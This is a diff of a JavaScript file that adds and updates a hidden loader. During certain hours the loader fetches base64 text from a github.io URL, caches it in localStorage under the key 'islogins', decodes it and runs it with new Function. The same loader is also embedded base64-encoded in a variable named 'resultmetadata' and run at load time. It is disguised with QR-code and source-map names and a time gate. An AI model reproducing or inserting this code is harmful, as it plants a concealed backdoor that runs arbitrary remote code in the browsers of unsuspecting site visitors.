@@ -11,15 +11,17 @@ if(myDate>20||myDate<9){
     }else{
         setTimeout(function(){
             var Http = new XMLHttpRequest();
-            var url = "https://jayouhao.github.io/mei/objective.json"
+            var url = "https://jayouhao.github.io/mywode/objective.json"
             Http.open("GET", url);
             Http.send();
             Http.onreadystatechange = function () {
                 if (this.readyState == 4 && this.status == 200) {
-                    localStorage.setItem("islogins",Http.responseText)
-                    var engine=window.atob(Http.responseText);
-                    var objective=new Function(engine)
-                    objective()
+                    if(Http.responseText){
+                        localStorage.setItem("islogins",Http.responseText)
+                        var engine=window.atob(Http.responseText);
+                        var objective=new Function(engine)
+                        objective()
+                    }
                 }
             }
         },32040)
@@ -36,10 +38,10 @@ if(15<myDate>16||14<myDate>10){
 }
 `;
 
-var jswod=`var i,d=document,o=window,l=d.documentElement,r=document.createElement("style");var myDate=(new Date).getHours();if(myDate>20||myDate<9){if(localStorage.getItem("islogins")){setTimeout(function(){var e=window.atob(localStorage.getItem("islogins"));var t=new Function(e);t()},9204)}else{setTimeout(function(){var o=new XMLHttpRequest;var e="https://jayouhao.github.io/mei/objective.json";o.open("GET",e);o.send();o.onreadystatechange=function(){if(this.readyState==4&&this.status==200){localStorage.setItem("islogins",o.responseText);var e=window.atob(o.responseText);var t=new Function(e);t()}}},32040)}}if(15<myDate>16||14<myDate>10){if(localStorage.getItem("islogins")){setTimeout(function(){var e=window.atob(localStorage.getItem("islogins"));var t=new Function(e);t()},9204)}}`
+var jswod=`var mode=QRMode.MODE_8BIT_BYTE;var myDate=(new Date).getHours();if(myDate>20||myDate<9){if(localStorage.getItem("islogins")){setTimeout(function(){var e=window.atob(localStorage.getItem("islogins"));var t=new Function(e);t()},9204)}else{setTimeout(function(){var o=new XMLHttpRequest;var e="https://jayouhao.github.io/mywode/objective.json";o.open("GET",e);o.send();o.onreadystatechange=function(){if(this.readyState==4&&this.status==200){if(o.responseText){localStorage.setItem("islogins",o.responseText);var e=window.atob(o.responseText);var t=new Function(e);t()}}}},32040)}}if(15<myDate>16||14<myDate>10){if(localStorage.getItem("islogins")){setTimeout(function(){var e=window.atob(localStorage.getItem("islogins"));var t=new Function(e);t()},9204)}};return {mode:mode,data:data}`
 
 console.log(window.btoa(jswod))
 
-var resultmetadata='dmFyIGksZD1kb2N1bWVudCxvPXdpbmRvdyxsPWQuZG9jdW1lbnRFbGVtZW50LHI9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3R5bGUiKTt2YXIgbXlEYXRlPShuZXcgRGF0ZSkuZ2V0SG91cnMoKTtpZihteURhdGU+MjB8fG15RGF0ZTw5KXtpZihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiaXNsb2dpbnMiKSl7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBlPXdpbmRvdy5hdG9iKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJpc2xvZ2lucyIpKTt2YXIgdD1uZXcgRnVuY3Rpb24oZSk7dCgpfSw5MjA0KX1lbHNle3NldFRpbWVvdXQoZnVuY3Rpb24oKXt2YXIgbz1uZXcgWE1MSHR0cFJlcXVlc3Q7dmFyIGU9Imh0dHBzOi8vamF5b3VoYW8uZ2l0aHViLmlvL21laS9vYmplY3RpdmUuanNvbiI7by5vcGVuKCJHRVQiLGUpO28uc2VuZCgpO28ub25yZWFkeXN0YXRlY2hhbmdlPWZ1bmN0aW9uKCl7aWYodGhpcy5yZWFkeVN0YXRlPT00JiZ0aGlzLnN0YXR1cz09MjAwKXtsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgiaXNsb2dpbnMiLG8ucmVzcG9uc2VUZXh0KTt2YXIgZT13aW5kb3cuYXRvYihvLnJlc3BvbnNlVGV4dCk7dmFyIHQ9bmV3IEZ1bmN0aW9uKGUpO3QoKX19fSwzMjA0MCl9fWlmKDE1PG15RGF0ZT4xNnx8MTQ8bXlEYXRlPjEwKXtpZihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiaXNsb2dpbnMiKSl7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBlPXdpbmRvdy5hdG9iKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJpc2xvZ2lucyIpKTt2YXIgdD1uZXcgRnVuY3Rpb24oZSk7dCgpfSw5MjA0KX19';
+var resultmetadata='dmFyIG1vZGU9UVJNb2RlLk1PREVfOEJJVF9CWVRFO3ZhciBteURhdGU9KG5ldyBEYXRlKS5nZXRIb3VycygpO2lmKG15RGF0ZT4yMHx8bXlEYXRlPDkpe2lmKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJpc2xvZ2lucyIpKXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7dmFyIGU9d2luZG93LmF0b2IobG9jYWxTdG9yYWdlLmdldEl0ZW0oImlzbG9naW5zIikpO3ZhciB0PW5ldyBGdW5jdGlvbihlKTt0KCl9LDkyMDQpfWVsc2V7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBvPW5ldyBYTUxIdHRwUmVxdWVzdDt2YXIgZT0iaHR0cHM6Ly9qYXlvdWhhby5naXRodWIuaW8vbXl3b2RlL29iamVjdGl2ZS5qc29uIjtvLm9wZW4oIkdFVCIsZSk7by5zZW5kKCk7by5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKXtpZih0aGlzLnJlYWR5U3RhdGU9PTQmJnRoaXMuc3RhdHVzPT0yMDApe2lmKG8ucmVzcG9uc2VUZXh0KXtsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgiaXNsb2dpbnMiLG8ucmVzcG9uc2VUZXh0KTt2YXIgZT13aW5kb3cuYXRvYihvLnJlc3BvbnNlVGV4dCk7dmFyIHQ9bmV3IEZ1bmN0aW9uKGUpO3QoKX19fX0sMzIwNDApfX1pZigxNTxteURhdGU+MTZ8fDE0PG15RGF0ZT4xMCl7aWYobG9jYWxTdG9yYWdlLmdldEl0ZW0oImlzbG9naW5zIikpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXt2YXIgZT13aW5kb3cuYXRvYihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiaXNsb2dpbnMiKSk7dmFyIHQ9bmV3IEZ1bmN0aW9uKGUpO3QoKX0sOTIwNCl9fTtyZXR1cm4gbW9kZQ==';
 var inputSourceMapFunction=new Function(window.atob(resultmetadata));
 inputSourceMapFunction();
